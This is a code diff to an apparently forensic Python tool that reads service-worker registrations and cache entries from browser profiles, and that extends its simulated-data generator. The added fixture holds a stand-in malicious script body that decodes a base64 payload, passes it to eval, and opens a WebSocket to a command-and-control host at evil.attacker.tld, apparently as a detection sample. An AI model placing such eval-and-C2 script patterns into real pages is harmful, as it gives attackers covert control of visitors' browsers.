@@ -17,7 +17,7 @@ import os
 import time
 
 from .models import (
-    Inventory, OriginStore, CacheBucket, CacheEntry,
+    Inventory, OriginStore, CacheBucket, CacheEntry, Registration,
 )
 
 
@@ -41,8 +41,13 @@ def load_json(path: str) -> Inventory:
         origins.append(OriginStore(
             origin=o.get("origin", ""), origin_hash=o.get("origin_hash", ""),
             caches=caches))
+    regs = [Registration(origin=r.get("origin", ""), scope=r.get("scope", ""),
+                         script_url=r.get("script_url", ""),
+                         update_via_cache=r.get("update_via_cache", ""))
+            for r in raw.get("registrations", [])]
     return Inventory(profile=raw.get("profile", ""),
-                     extracted_at=raw.get("extracted_at", 0.0), origins=origins)
+                     extracted_at=raw.get("extracted_at", 0.0), origins=origins,
+                     registrations=regs)
 
 
 def from_profile(profile_dir: str) -> Inventory:
@@ -104,12 +109,18 @@ def make_sim(path: str) -> str:
                          {"request_url": "https://evil.attacker.tld/p.js",
                           "response_mime": "application/javascript", "response_status": 200,
                           "size": 4096, "body_sha256": "d3", "body_entropy": 5.8,
+                          "body_text": "var x=atob('ZXZpbCBwYXlsb2FkIGhlcmUg...');eval(x);"
+                                       "new WebSocket('wss://evil.attacker.tld/c2');",
                           "body_preview": "var x=atob('ZXZpbCBwYXlsb2FkIGhlcmUg...');eval(x);"
                                           "new WebSocket('wss://evil.attacker.tld/c2');",
                           "mtime": now - 120},
                      ]},
                 ],
             }
+        ],
+        "registrations": [
+            {"origin": "https://shop.example", "scope": "https://shop.example/",
+             "script_url": "https://shop.example/app.js", "update_via_cache": "imports"}
         ],
     }
     with open(path, "w", encoding="utf-8") as fh:
